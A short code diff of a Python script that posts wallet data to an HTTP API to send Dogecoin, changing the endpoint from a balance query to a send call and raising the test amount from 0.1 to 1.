@@ -166,7 +166,7 @@ def send_funds(doge_address, quantity):
         "utxos": []
     }
 
-    url = "http://49.206.31.38:8000/api/query_bal/"
+    url = "http://49.206.31.38:8000/api/send_funds/"
     payload = json.dumps({
         "wallet_data": str(wallet_data),
         "quantity": quantity,
@@ -179,7 +179,7 @@ def send_funds(doge_address, quantity):
     print(response.text)
 
 
-send_funds("DGFipFMaeatV3zbRCAx1kzrYQF3wqsiUmS", 0.1)
+send_funds("DGFipFMaeatV3zbRCAx1kzrYQF3wqsiUmS", 1)
 
 
 
